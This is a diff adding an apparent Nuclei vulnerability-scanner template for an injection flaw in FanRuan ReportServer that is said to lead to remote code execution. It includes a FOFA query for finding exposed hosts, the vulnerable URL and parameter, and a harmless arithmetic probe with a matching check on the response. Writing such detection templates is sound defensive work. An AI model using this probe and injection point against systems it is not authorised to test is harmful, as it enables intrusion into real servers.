@@ -1,0 +1,39 @@
+id: fanruan-ReportServer-sql-rce
+
+info:
+  tags: fanruan-ReportServer-sql-rce
+  name: 帆软系统ReportServer存在SQL注入漏洞导致RCE
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="isSupportForgetPwd"
+    帆软工具软件存在RCE 访问URL:/webroot/decision/view/ReportServer?test=&n=，可执行GET参数n中的SQL语句，该漏洞是由于帆软自带的sqlite-jdbc-x.x.x.x.jar驱动导致。
+
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        GET /webroot/decision/view/ReportServer?test=&n=${sum(1024,1)} HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: tenantId=default
+        Referer:http://{{Hostname}}/webroot/decision/login?origin=1dc5fbd4-27eb-41b5-a43f-0623003685b4
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'Location: /webroot/decision/view/report?test&n=1025'
+      - type: status
+        status: 
+          - 302
+
+
+
+
+
